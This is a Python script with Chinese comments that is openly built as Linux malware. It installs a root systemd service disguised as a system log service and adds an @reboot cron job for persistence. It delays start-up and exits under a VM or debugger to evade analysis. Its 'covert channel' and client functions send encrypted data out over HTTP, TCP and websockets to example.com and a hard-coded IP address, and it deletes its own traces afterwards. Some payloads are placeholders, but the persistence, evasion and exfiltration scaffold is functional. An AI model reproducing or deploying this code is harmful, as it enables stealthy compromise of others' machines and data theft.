import os
import subprocess
import time
import random
import base64
import requests
import socket
import asyncio
import websockets
from cryptography.fernet import Fernet
import threading
import signal

# 加密密钥 (对称加密)
encryption_key = Fernet.generate_key()
cipher = Fernet(encryption_key)

# 动态生成服务名称和路径
service_name = f"syslog_{random.randint(1000, 9999)}.service"
service_file_path = f"/etc/systemd/system/{service_name}"

# 服务文件内容
service_content = f"""
[Unit]
Description=System Log Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /etc/systemd/system/hidden_{random.randint(1000, 9999)}.py
Restart=always
RestartSec=5
User=root
WorkingDirectory=/tmp
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
"""


def check_service_status(service_name):
    """检查服务是否处于激活状态"""
    try:
        status = subprocess.run(['systemctl', 'is-active', service_name], text=True, capture_output=True)
        return status.stdout.strip() == 'active'
    except subprocess.CalledProcessError as e:
        return False


def create_and_enable_service(service_file_path, service_content):
    """创建并启用服务"""
    try:
        # 写入服务文件
        with open(service_file_path, 'w') as service_file:
            service_file.write(service_content)

        # 重新加载 systemd 服务配置
        subprocess.run(['systemctl', 'daemon-reload'], check=True)

        # 启用并启动服务
        subprocess.run(['systemctl', 'enable', service_name], check=True)
        subprocess.run(['systemctl', 'start', service_name], check=True)

    except Exception as e:
        pass


def evade_antivirus():
    """高级杀毒软件规避示例"""
    # 随机延迟启动
    time.sleep(random.randint(10, 60))

    # 伪装服务名称为系统服务
    os.rename(service_file_path, f"/etc/systemd/system/{service_name}")

    # 检测虚拟机或调试环境
    if "VIRTUAL" in subprocess.getoutput("lscpu") or "DEBUG" in os.environ:
        exit()  # 退出以避免分析


def encrypt_data(data):
    """加密数据"""
    return cipher.encrypt(data.encode())


def covert_channel_communication():
    """多通道隐蔽回传功能示例"""
    while True:
        try:
            # 准备加密的数据
            data = encrypt_data("Sensitive Information")

            # 使用合法 API 进行隐蔽通信
            requests.post("https://example.com/api/upload", data={"data": base64.b64encode(data).decode()})

        except Exception as e:
            pass

        # 随机化通信时间
        time.sleep(random.randint(1200, 3600))  # 每20到60分钟传输一次


def clean_up():
    """清理操作痕迹"""
    try:
        os.remove(service_file_path)
        os.remove("/etc/systemd/system/hidden_script.py")
    except OSError:
        pass


class SelfMonitor:
    def __init__(self, restart_interval=60):
        """
        初始化自监控类。

        :param restart_interval: 重新检测程序状态的时间间隔（秒），默认为60秒。
        """
        self.restart_interval = restart_interval  # 每分钟检测一次
        self.process = None  # 保存当前进程对象

    def start_program(self):
        try:
            with open('/tmp/monitor_started', 'w') as f:
                f.write('Monitor started successfully!\n')
            # 继续程序逻辑
            while True:
                time.sleep(10)  # 模拟程序运行的任务
        except Exception as e:
            with open('/tmp/monitor_error.log', 'w') as f:
                f.write(f"主程序异常：{e}\n")

    def start(self):
        """
        启动监控器并启动主程序。
        """
        # 启动主程序
        self.process = threading.Thread(target=self.start_program, daemon=True)
        self.process.start()

        # 启动自监控
        self.monitor()

    def monitor(self):
        """
        定时自监控，每分钟检查一次程序是否正常运行。
        """
        while True:
            try:
                # 检查线程是否存活
                if not self.process.is_alive():
                    print("检测到程序未运行，正在重启...")
                    self.restart()

            except Exception as e:
                print(f"自监控发生异常：{e}")

            # 每次检测后等待指定时间
            time.sleep(self.restart_interval)

    def restart(self):
        """
        重启程序。
        """
        try:
            # 杀掉旧的线程
            if self.process:
                print("终止当前程序...")
                os.kill(self.process.ident, signal.SIGTERM)  # 发送终止信号

            # 创建新的线程重启程序
            self.process = threading.Thread(target=self.start_program, daemon=True)
            self.process.start()
            print("程序已重启成功。")

        except Exception as e:
            print(f"重启失败：{e}")


def add_cron_job(command):
    """
    添加一个 cron 作业，使得指定命令在系统重启时自动运行。

    :param command: 要运行的命令或程序的路径，例如 "python3 /path/to/monitor.py"
    """
    try:
        # 检查当前用户的现有 cron 作业
        existing_cron_jobs = subprocess.getoutput('crontab -l')

        # 如果当前没有 cron 作业，`crontab -l` 可能会输出错误信息，这时需特殊处理
        if "no crontab for" in existing_cron_jobs or not existing_cron_jobs.strip():
            # 如果没有任何 cron 作业，初始化为新的 cron 任务
            new_cron_jobs = f"@reboot {command} >/dev/null 2>&1"
        else:
            # 定义要插入的 cron 任务
            cron_job = f"@reboot {command} >/dev/null 2>&1"

            # 如果任务已存在，不重复添加
            if cron_job in existing_cron_jobs:
                print("该 cron 任务已存在，无需重复添加。")
                return

            # 合并现有的 cron 作业和新的作业
            new_cron_jobs = f"{existing_cron_jobs}\n{cron_job}"

        # 将新的 cron 作业写入用户的 crontab
        with open("temp_crontab.txt", "w") as temp_file:
            temp_file.write(new_cron_jobs + "\n")

        # 应用新的 crontab 文件
        os.system("crontab temp_crontab.txt")
        os.remove("temp_crontab.txt")

        print(f"成功添加 cron 任务：@reboot {command} >/dev/null 2>&1")

    except Exception as e:
        print(f"添加 cron 任务时出错：{e}")


async def send_websockets():
    uri = "ws://10.21.151.67:8082"  # 实际的服务器地址和端口
    async with websockets.connect(uri) as websocket:
        data = "websockets_data"  # 发送的数据
        encrypted_data = cipher.encrypt(data.encode('utf-8')).decode('utf-8')  # 加密数据
        await websocket.send(encrypted_data)


def send_http():
    http_data = "http_data"  # 要发送的数据
    encrypted_http_data = cipher.encrypt(http_data.encode('utf-8'))  # 加密数据

    url = "http://10.21.151.67:8081"  # 发送HTTP请求 实际服务器的IP地址和端口8081
    headers = {'Content-Type': 'application/octet-stream'}
    requests.post(url, data=encrypted_http_data, headers=headers)


def send_tcp():
    tcp_data = "tcp_data"  # 要发送的数据
    encrypted_tcp_data = cipher.encrypt(tcp_data.encode('utf-8'))  # 加密数据

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 创建TCP客户端套接字

    server_address = ('10.21.151.67', 8080)  # 连接到服务器 实际服务器的IP地址和端口8080
    client_socket.connect(server_address)

    try:
        client_socket.sendall(encrypted_tcp_data)  # 发送加密数据

    finally:
        client_socket.close()  # 关闭连接


if __name__ == "__main__":
    # 获取 monitor.py 的绝对路径
    monitor_script = os.path.abspath("monitor.py")  # 确保 monitor.py 在同一目录下或正确指定路径

    # 添加 cron 作业，指向 monitor.py
    add_cron_job(f"python3 {monitor_script}")

    # 启动自监控程序
    monitor = SelfMonitor()
    monitor.start()

    # 创建并启用服务
    if not check_service_status(service_name):
        create_and_enable_service(service_file_path, service_content)
        evade_antivirus()
        covert_channel_communication()
        clean_up()

    # 运行所有客户端
    send_http()
    send_tcp()
    asyncio.run(send_websockets())
